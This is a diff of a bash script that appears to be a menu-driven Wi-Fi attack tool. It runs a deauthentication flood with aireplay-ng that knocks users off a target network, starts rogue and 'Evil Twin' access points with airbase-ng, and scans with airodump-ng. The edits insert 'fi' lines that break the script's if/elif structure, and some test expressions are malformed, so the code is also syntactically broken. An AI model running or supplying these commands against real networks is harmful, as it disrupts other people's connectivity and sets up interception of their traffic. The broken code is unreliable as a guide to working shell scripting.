@@ -31,6 +31,7 @@ then
     read BSSID
     read NAMEW
     sudo airbase-ng -a $BSSID  -e $NAMEW -c 6 wlan0
+fi
     
 
 elif [[ $ATTACKTY == '3']]
@@ -38,14 +39,15 @@ then
     echo "This will launch a Deauthentication attack which will kick users out of a wifi network"
     sleep 1
     echo "A scan will be intiated, press CTRL+C to stop it once you found the target"
+    sudo airodump-ng $INTER
     echo "Enter target's BSSID"
     read BSSID3
     sudo aireplay-ng --deauth 1000 -a $BSSID3 $INTER
-
+fi
 elif [[ $ATTACKTY == '4']]
 then  
     echo "This is still under construction, sorry!"
-
+fi
 elif [[ $ATTACKTY == '5']]
 then
     echo "This will launch a Deauth attack, then create an Evil Twin of a wifi"
@@ -60,7 +62,7 @@ then
     sleep 1
     sudo 
     sudo airbase-ng -a $BSSID5  -e $EVNAME -c 6 $INTER
-
+fi
 
 
 
